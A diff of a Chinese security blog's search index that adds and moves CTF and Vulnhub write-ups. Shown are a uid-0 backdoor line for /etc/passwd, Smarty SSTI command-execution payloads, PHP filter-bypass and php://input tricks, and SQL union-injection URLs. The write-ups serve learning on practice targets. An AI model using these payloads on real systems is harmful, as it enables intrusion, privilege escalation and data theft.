-<p>小知识：<code>/etc/passwd</code>里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在<code>/etc/shadow</code>（这文件普通用户连读权限都没有）。但是，优先级是<code>/etc/passwd</code>优先，也就是如果<code>/etc/passwd</code>里面密码字段保存了密码，那么<code>/etc/shadow</code>中的密码就会失效！</p>
-</blockquote>
-<p>接下来的思路很明确了，修改<code>/etc/passwd</code>中root的密码字段，然后直接用<code>su -</code>命令切换。（也可以直接添加一条记录<code>echo "root2:加密密码:0:0:root:/root:/bin/bash"</code>，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥有root权限。）</p>
-<p>生成密码的加密密文： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 <span class="comment"># -1 某种加密算法</span></span><br><span class="line"></span><br><span class="line">明文：root</span><br><span class="line">密文：$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
-<p>（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
-<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su - 或者 su root <span class="comment"># 登录root</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
-<p>成功登录。</p>
-<p>第一个flag在<code>/home/mowree/user.txt</code>，第二个flag在<code>/root/root.txt</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
-<p>到此，本台靶机的渗透结束。</p>
-<h2 id="验证操作">验证操作</h2>
-<p>发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091627.png" /></p>
-<p>但是，如果改了<code>mowree</code>的密码，则可以直接使用ssh的密码登录。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407091712.png" /></p>
-<h1 id="总结">总结</h1>
-<p>对该靶机的练习，学到了许多东西。</p>
-<p>在web方面，除了之前的路径爆破之外，还了解到了<strong>参数爆破</strong>。已经<strong>文件包含漏洞的利用</strong>。在权限提升和反弹shell上，学到了<strong>SSH爆破</strong>和<strong>SSH公钥登录</strong>，还有这其中使用的一些小工具。</p>
-<p>还有一些Linux的小知识，比如可以多返回几次上一级目录，以及<code>find</code>命令的基本使用等。</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>SSH公钥登录</tag>
-        <tag>参数爆破</tag>
-        <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -3000,39 +3000,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CISCN2019 华东南赛区 Web11</title>
-    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，看到了一堆信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
-<h1 id="解题">解题</h1>
-<p>首先，我尝试了一下API Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
-<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
-<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
-<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
-<p>所以，我尝试用burp发送请求。终于</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
-<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
-<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
-<h1 id="总结">总结</h1>
-<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SSTI</tag>
-        <tag>smarty</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CISCN 2019 初赛 Love Math</title>
     <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
@@ -3089,6 +3056,39 @@
       </categories>
       <tags>
         <tag>PHP知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN2019 华东南赛区 Web11</title>
+    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，看到了一堆信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
+<h1 id="解题">解题</h1>
+<p>首先，我尝试了一下API Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
+<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
+<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
+<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
+<p>所以，我尝试用burp发送请求。终于</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
+<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
+<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
+<h1 id="总结">总结</h1>
+<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+        <tag>smarty</tag>
       </tags>
   </entry>
   <entry>
@@ -3510,6 +3510,86 @@
       </tags>
   </entry>
   <entry>
+    <title>MRCTF2020 套娃</title>
+    <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5D套娃">MRCTF2020 套娃</a></p>
+<span id="more"></span>
+<h1 id="题目信息">1. 题目信息</h1>
+<p>进入环境查看页面源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>除此之外，没有更多有用的信息了。</p>
+<h1 id="解题">2. 解题</h1>
+<h2 id="前置知识">2.1. 前置知识</h2>
+<h3 id="server">2.1.1. <code>$_SERVER</code></h3>
+<blockquote>
+<p>$_SERVER 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。</p>
+</blockquote>
+<p>参考链接：</p>
+<ul>
+<li>c.biancheng.net/view/6185.html</li>
+</ul>
+<p>这里主要介绍一下题目中的<code>$_SERVER['QUERY_STRING']</code>。假设我们的url为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hdfzzf.com/index.php/?name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
+<p>那么经过<code>$query = $_SERVER['QUERY_STRING'];</code>之后，<code>$query</code>变为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
+<p>即，该代码作用就是获得url中的参数部分。</p>
+<h3 id="substr_count">2.1.2. substr_count()</h3>
+<p>该函数的作用非常简单，那就是<strong>计算子串在字符串中出现的次数</strong>。</p>
+<p>一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 Shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>结果为：2</p>
+<p>注意：该函数区分大小写。将上面例子稍作修改： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>此时结果为：0</p>
+<h3 id="preg_matchpattern-string">2.1.3. preg_match(pattern, string)</h3>
+<p>PHP中的正则匹配，返回值是匹配次数。<strong>它的值为0或者1</strong>，这是因为第一次匹配到的时候就会结束该函数。如果需要一直搜索到结尾，可以使用preg_match_all(pattern, string)。</p>
+<p>需要注意的是，正则匹配默认都是匹配一行的，如果需要匹配多行，需要在正则表达式的最后加上<code>m</code>。</p>
+<h3 id="getip">2.1.4. getIp()</h3>
+<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIp();</span><br></pre></td></tr></table></figure></p>
+<p>简单总结一下就是该函数通过HTTP头部中的<code>client-ip</code>来获取客户端的IP。</p>
+<h2 id="解题过程">2.2. 解题过程</h2>
+<h3 id="套娃1">2.2.1. 套娃1</h3>
+<p>根据代码审计可以知道：</p>
+<ul>
+<li>要绕过if，即查询语句不能包含<code>_</code>以及<code>%5f</code>，后者就是前者url编码之后的结果；</li>
+<li>b_u_p_t的值不能为23333，又得满足preg_match函数的返回值为1</li>
+</ul>
+<p>因为substr_count()函数区分大小写，因此可以使用大小写绕过，即<code>%5F</code>即可。</p>
+<p>而preg_match默认只匹配一行，假设我们输入如下：(%oa是换行符的url编码) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23333%0a</span><br></pre></td></tr></table></figure></p>
+<p>那么preg_match函数只匹配第一行，第一行只有23333，因此满足以23333开头，以23333结尾的要求，从而返回值为1。并且，此时的值不是23333，因为最后有一个换行符，因此绕过强类型匹配。</p>
+<p>从而payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure></p>
+<p>得到如下提示：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094613.png" /></p>
+<h3 id="套娃2">2.2.2. 套娃2</h3>
+<p>去访问对应的文件，得到如下提示：（我还以为改一下XFF就可以，天真） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!  </span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned!</span><br></pre></td></tr></table></figure></p>
+<p>查看源码，得到一串不知名的注释，这里有一个小技巧，可以将这个注释放入控制台执行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094919.png" /></p>
+<p>因此POST请求，带入参数Merak，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>从源码中可以得到以下信息：</p>
+<ul>
+<li>flag应该在flag.php中</li>
+<li>这里获得客户端IP不是通过XFF，而是通过client-ip</li>
+<li>GET方式传入2333，并且得满足<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code></li>
+<li>利用最后的file_get_contents()读取flag.php中的内容，但是需要经过change()函数</li>
+</ul>
+<p>第三点可以通过<code>php://input [POSTt] odat is happy day</code>绕过。</p>
+<p>这里主要说面一下change函数的绕过。我们的目的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change($_GET[&#x27;file&#x27;]) -&gt; flag.php</span><br></pre></td></tr></table></figure></p>
+<p>即，我们输入payload，经过change函数，变成flag.php。因此我们可以根据change函数写出它的逆过程。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">v</span>):</span>  </span><br><span class="line">    re = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    v = base64.b64decode(v).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># byte -&gt; str  </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)):  </span><br><span class="line">        re += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v[i]) + i*<span class="number">2</span>))  </span><br><span class="line">          </span><br><span class="line">    <span class="keyword">return</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unchange</span>(<span class="params">fileName</span>):</span>  </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fileName)):  </span><br><span class="line">         payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fileName[i]) - <span class="number">2</span>*i)  </span><br><span class="line">  </span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># str -&gt; byte  </span></span><br><span class="line">    <span class="keyword">return</span> payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    fileName = <span class="string">&#x27;flag.php&#x27;</span>  </span><br><span class="line">    payload = unchange(fileName)  </span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 最终的payload</span></span><br><span class="line">    <span class="built_in">print</span>(change(payload)) <span class="comment"># 验证是否正确</span></span><br></pre></td></tr></table></figure></p>
+<p>最后得到payload为：ZmpdYSZmXGI=</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421095706.png" /></p>
+<h1 id="总结">3. 总结</h1>
+<p>考察了：</p>
+<ul>
+<li>substr_count()区分大小写</li>
+<li>php://input伪协议绕过</li>
+<li>函数逆向</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP伪协议</tag>
+        <tag>PHP基础知识</tag>
+        <tag>函数逆向</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NCTF2019 Fake XML cookbook</title>
     <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
@@ -3786,7 +3866,7 @@
 <p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
 <h3 id="过程">过程</h3>
 <p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
-<p>发现admin、(、)等都被过滤了，那么只好将字符串转为16进制尝试。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
+<p>这里有一个细节看：[[SQL注入总结#利用]] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin&#x27;#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
 <p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
 <p>发现显示字段还是5个</p>
@@ -3887,86 +3967,6 @@
       <tags>
         <tag>SQL注入</tag>
         <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MRCTF2020 套娃</title>
-    <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5D套娃">MRCTF2020 套娃</a></p>
-<span id="more"></span>
-<h1 id="题目信息">1. 题目信息</h1>
-<p>进入环境查看页面源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></p>
-<p>除此之外，没有更多有用的信息了。</p>
-<h1 id="解题">2. 解题</h1>
-<h2 id="前置知识">2.1. 前置知识</h2>
-<h3 id="server">2.1.1. <code>$_SERVER</code></h3>
-<blockquote>
-<p>$_SERVER 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。</p>
-</blockquote>
-<p>参考链接：</p>
-<ul>
-<li>c.biancheng.net/view/6185.html</li>
-</ul>
-<p>这里主要介绍一下题目中的<code>$_SERVER['QUERY_STRING']</code>。假设我们的url为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hdfzzf.com/index.php/?name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
-<p>那么经过<code>$query = $_SERVER['QUERY_STRING'];</code>之后，<code>$query</code>变为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
-<p>即，该代码作用就是获得url中的参数部分。</p>
-<h3 id="substr_count">2.1.2. substr_count()</h3>
-<p>该函数的作用非常简单，那就是<strong>计算子串在字符串中出现的次数</strong>。</p>
